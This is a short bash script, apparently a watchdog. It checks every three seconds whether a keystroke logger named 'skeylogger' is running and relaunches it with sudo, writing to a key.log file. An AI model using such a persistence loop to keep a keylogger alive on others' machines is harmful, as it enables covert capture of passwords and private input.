while true; do
    n=`sudo pgrep skeylogger`
    if [[ -z "$n" ]]; then
        echo "skeylogger is not running"
        sudo /home/cpp/logger/trunk/skeylogger 2>&1 /home/cpp/logger/trunk/key.log
        elif [[ -n "$n" ]]; then
        echo "skeylogger is  running"
    fi
    sleep 3
done